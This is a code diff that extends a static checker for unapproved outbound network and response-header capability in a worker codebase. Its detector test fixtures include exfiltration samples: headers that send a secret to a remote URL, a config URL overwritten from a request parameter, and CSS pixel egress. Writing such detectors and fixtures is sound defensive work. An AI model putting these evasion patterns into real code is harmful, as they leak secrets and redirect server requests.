@@ -2011,10 +2011,12 @@ function hasAiRuntimeBoundary(content, path = "") {
   };
   const expectedConfigInitializers = approvedConfigInitializers[path];
   const usesApprovedConfigFetch = directFetchArguments.includes("`${config.url}${path}`");
+  const hasApprovedConfigMutation = /(?:\bconfig\s*(?:\.\s*url|\[\s*["'`]url["'`]\s*\])\s*(?:[+\-*/%]?=|\+\+|--)|\bdelete\s+config\s*(?:\.\s*url|\[\s*["'`]url["'`]\s*\])|\bObject\.(?:assign|defineProperty)\s*\(\s*config\b|\bReflect\.set\s*\(\s*config\s*,\s*["'`]url["'`])/i.test(normalizedContent);
   const hasUnapprovedConfigOrigin = usesApprovedConfigFetch && (
     !expectedConfigInitializers
     || configInitializers.length !== expectedConfigInitializers.length
     || configInitializers.some((initializer, index) => initializer !== expectedConfigInitializers[index])
+    || hasApprovedConfigMutation
   );
   const memberFetchReceivers = [...content.matchAll(/\b([A-Za-z_$][\w$]*)\.fetch\s*\(/g)].map((match) => match[1]);
   const hasUnapprovedMemberFetch = memberFetchReceivers.some((receiver) => receiver !== "phase1Worker")
@@ -2071,11 +2073,31 @@ function hasAiRuntimeBoundary(content, path = "") {
       }
     }
   }
+  const headersObjectAliases = new Set([...normalizedContent.matchAll(/\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*(?::[^=;]+)?=\s*new\s+Headers\b/g)]
+    .map((match) => match[1]));
+  let propagatedHeadersObjectAlias = true;
+  while (propagatedHeadersObjectAlias) {
+    propagatedHeadersObjectAlias = false;
+    for (const { target, source } of headersInitAliasAssignments) {
+      if (headersObjectAliases.has(source) && !headersObjectAliases.has(target)) {
+        headersObjectAliases.add(target);
+        propagatedHeadersObjectAlias = true;
+      }
+    }
+  }
+  const dynamicHeadersMutations = [...headersObjectAliases].flatMap((alias) =>
+    [...normalizedContent.matchAll(new RegExp(`\\b${alias}\\.(set|append)\\s*\\((?!\\s*["'\`])\\s*([A-Za-z_$][\\w$]*)`, "g"))]
+      .map((match) => ({ alias, method: match[1], argument: match[2] }))
+  );
+  const hasUnapprovedDynamicHeadersMutation = dynamicHeadersMutations.length > 0
+    && !(path === "apps/worker/src/index.ts" && dynamicHeadersMutations.length === 1
+      && dynamicHeadersMutations[0].alias === "headers" && dynamicHeadersMutations[0].method === "set"
+      && dynamicHeadersMutations[0].argument === "key");
   const hasComputedHeadersInit = /(?:\bheaders\s*:|\bnew\s+Headers\s*\()\s*\[\s*\[(?!\s*["'`])\s*/i.test(normalizedContent)
     || [...computedHeadersInitAliases].some((alias) => new RegExp(`(?:\\bheaders\\s*:\\s*|\\bnew\\s+Headers\\s*\\(\\s*)${alias}\\b`).test(normalizedContent));
   const hasComputedResponseHeader = /\bheaders\s*:\s*\{[^}]*\[[^\]]+\]\s*:/i.test(normalizedContent)
     || /\bnew\s+Headers\s*\(\s*\{[^}]*\[[^\]]+\]\s*:/i.test(normalizedContent)
-    || hasComputedHeadersInit;
+    || hasComputedHeadersInit || hasUnapprovedDynamicHeadersMutation;
   const hasUnreviewedResponseCapability = hasObscuredResponseCapability || hasComputedResponseHeader
     || (!responseCapabilityPinnedFiles.has(path) && /\b(?:Response|Headers)\b/.test(normalizedContent));
   const hasUnapprovedOutboundCapability = (
@@ -2354,6 +2376,8 @@ for (const fixture of [
   { content: 'const name = "Ref" + "resh"; const init: HeadersInit = [[name, `0; url=${env.REMOTE_URL}?data=${secret}`]]; return new Response("", { headers: init });', path: "apps/worker/src/capture-router.ts" },
   { content: 'const name = "Ref" + "resh"; let init: HeadersInit = []; init = [[name, `0; url=${env.REMOTE_URL}?data=${secret}`]]; const forwarded = init; return new Response("", { headers: forwarded });', path: "apps/worker/src/capture-router.ts" },
   { content: 'return new Response("", { headers: { Link: `<${env.REMOTE_URL}?data=${secret}>; rel=preload; as=image` } });', path: "apps/worker/src/capture-router.ts" },
+  { content: 'const name = "Li" + "nk"; const h = new Headers(); h.set(name, `<${env.REMOTE_URL}?data=${secret}>; rel=preload; as=image`); return new Response("", { headers: h });', path: "apps/worker/src/capture-router.ts" },
+  { content: 'const config = inspectSupabaseConfig(env).config; const config = ensureConfig(env); config.url = new URL(request.url).searchParams.get("target") ?? config.url; return fetch(`${config.url}${path}`);', path: "apps/worker/src/manual-router.ts" },
   { content: '<div style="background:u\\\\72l(//api.groq.com/pixel)"></div>', path: "apps/brand-site/public/css-escape-egress.html" },
   { content: '<div style="background-image:image-set(\'//api.groq.com/pixel\' 1x)"></div>', path: "apps/brand-site/public/css-image-set-egress.html" },
   { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
